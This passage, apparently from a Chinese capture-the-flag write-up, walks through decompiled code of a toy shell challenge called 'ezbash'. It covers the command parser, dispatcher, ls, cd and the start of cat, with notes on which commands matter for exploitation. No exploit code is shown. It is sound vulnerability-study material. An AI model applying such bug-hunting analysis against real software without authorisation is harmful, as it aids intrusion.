class=\"title function_\">process</span><span class=\"params\">(<span class=\"type\">char</span> *a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+1Ch] [rbp-14h]</span></span><br><span class=\"line\">  _QWORD *ptr; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *i; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = <span class=\"number\">64</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  ptr = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x200</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: allocation error\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x19</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = strtok(a1, <span class=\"string\">&quot; \\t\\r\\n\\a&quot;</span>); i; i = strtok(<span class=\"number\">0LL</span>, <span class=\"string\">&quot; \\t\\r\\n\\a&quot;</span>) )<span class=\"comment\">// split</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ptr[v3++] = i;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 &gt;= v2 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v2 += <span class=\"number\">0x40</span>;</span><br><span class=\"line\">      ptr = <span class=\"built_in\">realloc</span>(ptr, <span class=\"number\">8LL</span> * v2);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !ptr )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        fwrite(<span class=\"string\">&quot;ezbash: allocation error\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x19</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ptr[v3] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ptr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>后面指令的实现都是通过保留的字符串指针分析比较的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">check</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !*cmd )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; L11(); ++i )                 <span class=\"comment\">// i&lt;11</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(*cmd, *(&amp;<span class=\"built_in\">list</span> + i)) )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> (funcs[i])(cmd);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s: command not found\\n&quot;</span>, *cmd);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>list 保存各个命令的名称进行比较，cmd 是处理后的保留字符串地址的 chunk。fucns 保存各个命令的函数的地址。</p>\n<p>程序会使用 2 个全局变量记录我们的当前位置，一个是我们所在的文件夹的指针，一个是字符串记录的是从 home 到当前位置的路径的名字。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:<span class=\"number\">0000000000006140</span> cur_position_addr db <span class=\"number\">50</span>h <span class=\"title function_\">dup</span><span class=\"params\">(?)</span>         ; DATA XREF: apwd+<span class=\"number\">10</span>↑o</span><br><span class=\"line\">.bss:<span class=\"number\">0000000000006140</span>                                         ; acd+<span class=\"number\">10F</span>↑o ...</span><br><span class=\"line\">.bss:<span class=\"number\">0000000000006190</span> ; file *cuurr_pos</span><br><span class=\"line\">.bss:<span class=\"number\">0000000000006190</span> cuurr_pos       dq ?                    ; DATA XREF: unlink:loc_15F0↑r</span><br></pre></td></tr></table></figure>\n<p>其实真正利用的命令没有多少，ls，pwd，help，exit，cd，cat，touch, 都没有漏洞的利用。</p>\n<h4 id=\"ls\"><a class=\"markdownIt-Anchor\" href=\"#ls\">#</a> ls</h4>\n<p>列出当前文件夹下的内容，或者以及子文件夹的内容，成灰只可以识别到以及子文件夹，对于 A/B, 成为程序人为这是一个 file 的名称，而不是一条路径。但是./A 是有效的，程序会识别./ 为当前目录。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">als</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> **cmd, __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v4; <span class=\"comment\">// rsp</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v8; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v9; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  __int64 v10[<span class=\"number\">3</span>]; <span class=\"comment\">// [rsp+8h] [rbp-A0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> **comment; <span class=\"comment\">// [rsp+20h] [rbp-88h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v12; <span class=\"comment\">// [rsp+37h] [rbp-71h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v13; <span class=\"comment\">// [rsp+38h] [rbp-70h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v14; <span class=\"comment\">// [rsp+3Ch] [rbp-6Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> nums; <span class=\"comment\">// [rsp+40h] [rbp-68h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v16; <span class=\"comment\">// [rsp+44h] [rbp-64h]</span></span><br><span class=\"line\">  file *v17; <span class=\"comment\">// [rsp+48h] [rbp-60h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *s1; <span class=\"comment\">// [rsp+50h] [rbp-58h]</span></span><br><span class=\"line\">  file *v19; <span class=\"comment\">// [rsp+58h] [rbp-50h]</span></span><br><span class=\"line\">  __int64 v20; <span class=\"comment\">// [rsp+60h] [rbp-48h]</span></span><br><span class=\"line\">  __int64 v21; <span class=\"comment\">// [rsp+68h] [rbp-40h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *dest; <span class=\"comment\">// [rsp+70h] [rbp-38h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> delim[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+7Eh] [rbp-2Ah] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v24; <span class=\"comment\">// [rsp+80h] [rbp-28h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  comment = cmd;</span><br><span class=\"line\">  v24 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v17 = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">  v19 = cuurr_pos;</span><br><span class=\"line\">  v20 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v12 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  nums = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(delim, <span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( comment[++nums] )                     <span class=\"comment\">// 只有ls 就会跳过</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(comment[nums]) &lt;= v14 )</span><br><span class=\"line\">      v2 = v14;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      v2 = <span class=\"built_in\">strlen</span>(comment[nums]) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    v14 = v2;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v21 = v14 - <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  v10[<span class=\"number\">0</span>] = v14;</span><br><span class=\"line\">  v10[<span class=\"number\">1</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">16</span> * ((v14 + <span class=\"number\">15LL</span>) / <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v10 != (v10 - (v3 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  v4 = alloca(v3 &amp; <span class=\"number\">0xFFF</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (v3 &amp; <span class=\"number\">0xFFF</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    *(&amp;v10[<span class=\"number\">-1</span>] + (v3 &amp; <span class=\"number\">0xFFF</span>)) = *(&amp;v10[<span class=\"number\">-1</span>] + (v3 &amp; <span class=\"number\">0xFFF</span>));</span><br><span class=\"line\">  dest = v10;</span><br><span class=\"line\">  v16 = nums - <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nums == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    info_ls();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  nums = <span class=\"number\">1</span>;</span><br><span class=\"line\">LABEL_44:</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nums &lt;= v16 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v14 = <span class=\"built_in\">strlen</span>(comment[nums]);</span><br><span class=\"line\">    v13 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(dest, comment[nums]);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( s1 = strtok(dest, delim); ; s1 = strtok(<span class=\"number\">0LL</span>, delim) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !s1 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">LABEL_43:</span><br><span class=\"line\">        cuurr_pos = v19;</span><br><span class=\"line\">        ++nums;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_44;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      v17 = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(s1, <span class=\"string\">&quot;.&quot;</span>) )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_16;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(s1, off_4077) )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      v12 = findfile(&amp;v17, s1);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v12 != <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: cannot access &#x27;%s&#x27;: No such file or directory\\n&quot;</span>, s1);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_43;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( checkfile(v17) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v7 = v14;</span><br><span class=\"line\">        v8 = <span class=\"built_in\">strlen</span>(s1);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(&amp;dest[v7 - v8], s1) )</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(v17-&gt;name);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">          <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: cannot access &#x27;%s&#x27;: Not a directory\\n&quot;</span>, comment[nums]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v16 &gt; <span class=\"number\">1</span> &amp;&amp; nums &lt; v16 )</span><br><span class=\"line\">          <span class=\"built_in\">putchar</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_43;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( checkfolder(v17) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        cuurr_pos = v17;</span><br><span class=\"line\">        v9 = <span class=\"built_in\">strlen</span>(s1);</span><br><span class=\"line\">        v13 += v9 + <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">LABEL_32:</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !comment[nums][v13 - <span class=\"number\">1</span>] || comment[nums][v13 - <span class=\"number\">1</span>] == <span class=\"number\">47</span> &amp;&amp; !comment[nums][v13] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v16 &gt; <span class=\"number\">1</span> )</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s:\\n&quot;</span>, comment[nums]);</span><br><span class=\"line\">        info_ls();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v16 &gt; <span class=\"number\">1</span> &amp;&amp; nums &lt; v16 )</span><br><span class=\"line\">        <span class=\"built_in\">putchar</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( cuurr_pos-&gt;futher )</span><br><span class=\"line\">      cuurr_pos = cuurr_pos-&gt;futher;</span><br><span class=\"line\">LABEL_16:</span><br><span class=\"line\">    v6 = <span class=\"built_in\">strlen</span>(s1);</span><br><span class=\"line\">    v13 += v6 + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>讲真 ls 代码很长，但是没啥用，特别是那个 alloca，就是浪费时间。</p>\n<h4 id=\"cd\"><a class=\"markdownIt-Anchor\" href=\"#cd\">#</a> cd</h4>\n<p>cd 也是一个简单的跳到跳到某个目录下，实际就是更改下那两个变量，以及链表的遍历。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">acd</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v1; <span class=\"comment\">// al</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v3; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> len_name; <span class=\"comment\">// [rsp+18h] [rbp-38h]</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *s1; <span class=\"comment\">// [rsp+20h] [rbp-30h]</span></span><br><span class=\"line\">  file *pos; <span class=\"comment\">// [rsp+28h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> delim[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+36h] [rbp-1Ah] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v8; <span class=\"comment\">// [rsp+38h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( cmd[<span class=\"number\">1</span>] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( cmd[<span class=\"number\">2</span>] )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fwrite(<span class=\"string\">&quot;ezbash: too many arguments\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x1B</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">strcpy</span>(delim, <span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( s1 = strtok(cmd[<span class=\"number\">1</span>], delim); s1; s1 = strtok(<span class=\"number\">0LL</span>, delim) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(s1, <span class=\"string\">&quot;.&quot;</span>) )                  <span class=\"comment\">// 当前目录下或者父目录</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(s1, off_4077) )          <span class=\"comment\">// ../</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( cuurr_pos-&gt;futher )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              len_name = <span class=\"built_in\">strlen</span>(cuurr_pos-&gt;name);</span><br><span class=\"line\">              cur_position_addr[(<span class=\"built_in\">strlen</span>(cur_position_addr) - <span class=\"number\">1</span> - len_name)] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              cuurr_pos = cuurr_pos-&gt;futher;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            pos = cuurr_pos-&gt;firstson;          <span class=\"comment\">// ./</span></span><br><span class=\"line\">            ((&amp;check_error + <span class=\"number\">1</span>))();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v1 )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: %s: No such file or directory\\n&quot;</span>, s1);</span><br><span class=\"line\">              <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> ( pos &amp;&amp; <span class=\"built_in\">strcmp</span>(pos-&gt;name, s1) )<span class=\"comment\">// 参数的第一的目标位置文件夹</span></span><br><span class=\"line\">              pos = pos-&gt;next_bro;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !checkfolder(pos) )            <span class=\"comment\">// 检查是否为目录</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              fwrite(<span class=\"string\">&quot;something wrong happened\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x19</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">              <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            cuurr_pos = pos;</span><br><span class=\"line\">            v3 = <span class=\"built_in\">strlen</span>(cur_position_addr);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v3 + <span class=\"built_in\">strlen</span>(pos-&gt;name) &lt;= <span class=\"number\">0x50</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"built_in\">strcat</span>(cur_position_addr, pos-&gt;name);</span><br><span class=\"line\">              *&amp;cur_position_addr[<span class=\"built_in\">strlen</span>(cur_position_addr)] = <span class=\"string\">&#x27;/&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;ezbash: expected argument\\n&quot;</span>, <span class=\"number\">1uLL</span>, <span class=\"number\">0x1A</span>uLL, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"cat\"><a class=\"markdownIt-Anchor\" href=\"#cat\">#</a> cat</h4>\n<p>cat 会输出文件中的数据，采用的是 puts，只会输出字符串。为实现 cat 重定向到文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">acat</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span 